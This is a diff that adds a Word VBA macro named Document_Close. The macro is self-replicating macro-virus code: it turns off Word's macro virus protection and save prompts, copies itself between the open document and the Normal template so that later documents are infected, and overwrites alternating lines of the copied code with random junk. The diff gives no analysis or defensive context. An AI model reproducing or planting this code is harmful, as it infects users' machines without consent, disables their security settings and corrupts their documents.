@@ -1,0 +1,27 @@
+Sub Document_Close()
+On Error Resume Next
+Application.EnableCancelKey = 0
+KC7 = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
+Options.SaveNormalPrompt = 0
+VR71 = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
+Options.VirusProtection = 0
+Options.ConfirmConversions = 0
+If KC7 > 0 And VR71 > 0 Then GoTo LE96
+If KC7 = 0 Then
+Set VL56 = ActiveDocument.VBProject.VBComponents.Item(1)
+SF81 = True
+End If
+If VR71 = 0 Then
+Set VL56 = NormalTemplate.VBProject.VBComponents.Item(1)
+UL53 = True
+End If
+If UL53 <> True And SF81 <> True Then GoTo LE96
+If UL53 = True Then VL56.CodeModule.AddFromString ("Sub AutoClose()" & vbCr & ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, KC7 - 1))
+If SF81 = True Then VL56.CodeModule.AddFromString ("Sub Document_Close()" & vbCr & NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, VR71 - 1))
+With VL56.CodeModule
+For x = 2 To (VL56.CodeModule.CountOfLines - 1) Step 2
+.replaceline x, (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & " = " & (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & " + " & (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22)))
+Next x
+End With
+LE96:
+End Sub
